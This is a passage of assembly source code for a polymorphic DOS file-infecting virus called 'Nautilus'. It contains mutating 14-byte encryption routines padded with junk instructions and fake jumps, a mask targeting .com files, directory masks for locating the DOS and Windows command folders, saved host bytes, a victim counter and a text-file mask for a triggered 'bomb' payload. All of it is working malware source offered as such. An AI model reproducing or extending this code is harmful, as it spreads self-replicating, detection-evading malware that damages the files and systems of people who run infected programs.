rol  al,cl                    ; 2
cld                           ; 1
                              ; = 14

Pos2CR4:
cmp  al,12h                   ; 2
jne  Fakejmp                  ; 2
Fakejmp:
sti                           ; 1
cld                           ; 1
rol  al,cl                    ; 2
nop                           ; 1
nop                           ; 1
xor  al,ch                    ; 2
rol  al,cl                    ; 2
                              ; = 14

PosCR5:
cld                           ; 1
ror  al,cl                    ; 2
xor  al,ch                    ; 2
not  al                       ; 2
nop                           ; 1
nop                           ; 1
xor  al,ch                    ; 2
nop                           ; 1
ror  al,cl                    ; 2
                              ; = 14

Pos2CR5:
ror  al,cl                    ; 2
xor  al,ch                    ; 2
rol  al,cl                    ; 2
not  al                       ; 2
rol  al,cl                    ; 2
xor  al,ch                    ; 2
ror  al,cl                    ; 2
                              ; = 14

PosCR6:
xor  al,ch                    ; 2
nop                           ; 1
xchg bx,dx                    ; 2
nop                           ; 1
nop                           ; 1
ror  al,cl                    ; 2
stc                           ; 1
xor  al,ch                    ; 2
xchg bx,dx                    ; 2
                              ; = 14

Pos2CR6:
rol  al,cl                    ; 2
xor  al,ch                    ; 2
nop                           ; 1
xor  al,0D8h                  ; 2
cmp  al,4h                    ; 2
xor  al,ch                    ; 2
sti                           ; 1
rol  al,cl                    ; 2
                              ; = 14

PosCR7:
xor  al,ch                    ; 2
cmp  al,4h                    ; 2
jne  FakeJmp2                 ; 2
stc                           ; 1
FakeJmp2:
sti                           ; 1
stc                           ; 1
cld                           ; 1
xchg bx,ax                    ; 1
xchg bx,ax                    ; 1
stc                           ; 1
nop                           ; 1
                              ; = 14

Pos2CR7:
rol  al,cl                    ; 2
xor  al,ch                    ; 2
rol  al,cl                    ; 2
not  al                       ; 2
rol  al,cl                    ; 2
xor  al,ch                    ; 2
rol  al,cl                    ; 2
                              ; = 14

PosCR8:
xor  al,ch                    ; 2
rol  al,cl                    ; 2
xor  al,ch                    ; 2
not  al                       ; 2
xor  al,ch                    ; 2
rol  al,cl                    ; 2
xor  al,ch                    ; 2
                              ; = 14

Pos2CR8:
xor  al,ch                    ; 2
rol  al,cl                    ; 2
xor  al,0C7h                  ; 2
neg  al                       ; 2
xor  al,0C7h                  ; 2
rol  al,cl                    ; 2
xor  al,ch                    ; 2
                              ; = 14


EndMorphs:

filemask  db   '*.com',0      ; The type of files we are gonna infect.
textmask  db   '*.txt',0      ; Text files to find when bomb goes off
dos_mask  db   'dos',0        ; Mask for finding DOS
win_mask  db   'windows',0    ; Mask for finding Windows
win_com   db   'command',0    ; Mask for finding .\windows\command
dot_dot   db   '..',0         ; Mask for previous directory.


saved     db   0CDh,020h,0h   ; This is the storage space for the first
                              ; three bytes from the infected file. CD20 is
                              ; the 'int 20h' instruction used to exit.


Infectedby     db   'Sea4         '     ; Place to keep virus lineage
MyName         db   'Nautilus.com '     ; Current infected file

Virus_Name     db   '[Nautilus]',0
Author         db   'Sea4, Codebreakers',0

textlen   EQU DCryptie-Line1

; Below is the first sentence of the Jules Verne classic from whence I got
; the name of this virus. "Twenty Thousand Leagues Under the Sea"

line1  db 'The year 1866 was made notable by a series of bizarre',CR,LF
line2  db 'events, a chain of mysterious phenomena which have never',CR,LF
line3  db 'been explained, that I am sure no one has forgotten.',CR,LF

CR   EQU 0Dh
LF   EQU 0Ah    ; Carrige Return Line Feed ( next line )

DCryptie:
lodsb                    ; Gets next byte Doomed for De/Encryption
xchg dx,cx               ; Saves the count while using the DE/ENcrypt value
MorphD1:
db   14 dup    90h       ; The encryption instructions will be at most
                         ; 14 bytes long.
xchg dx,cx               ; Returns the count value to CX
stosb                    ; Puts the encrypted byte into mem
loop DCryptie            ; Does all the bytes specified by CX
ret                      ; Jumps back to the caller

Xor2Val   db   00h  ; Xor value to be used in DCryptie
DecVal2   db   00h  ; Decrypt value 2
EncVal2   db   00h  ; Encrypt value 2

Cryptie:
lodsb                    ; Gets the next byte to De/Encrypt
xchg dx,cx
MorphD2:
db   14 dup    90h       ; The encryption instructions will be at most
                         ; 14 bytes long.
xchg dx,cx
stosb                    ; Plugs AL back into mem
loop Cryptie             ; Does all the bytes specified by CX
ret                      ; Jumps back to where it was called

Xor1Val   db   00h  ; Xor value to be used in Cryptie
DecVal1   db   00h  ; Decrypt value 1
EncVal1   db   00h  ; Encrypt value 1

ende:
; Here is a buffer specifically for file attributes/date/time/size
; It is not saved with the virus, so it doesn't actually take up mem. :)
; Just the offsets are used.
s_attr    db   0h        ; File attributes
s_time    dw   0h        ; Saved Time Last Modified
s_date    dw   0h        ; Saved Date Last Modified
s_size    dd   0h        ; Size of file ( before modification)
Victems   db   00h       ; Place to keep count of victems
CurDIR    db 64 DUP (90)
buffer:
